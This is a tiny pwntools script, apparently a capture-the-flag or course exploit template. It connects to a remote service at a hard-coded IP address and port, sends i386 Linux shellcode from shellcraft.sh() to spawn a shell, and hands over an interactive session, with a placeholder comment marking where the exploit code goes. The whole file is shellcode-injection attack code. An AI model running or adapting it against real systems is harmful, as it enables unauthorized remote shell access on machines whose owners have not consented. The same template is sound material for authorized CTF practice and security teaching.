from pwn import *
context(arch = 'i386', os = 'linux', log_level='debug')

r = remote('140.113.194.81', 20149)
# EXPLOIT CODE GOES HERE
r.send(asm(shellcraft.sh()))
r.interactive()
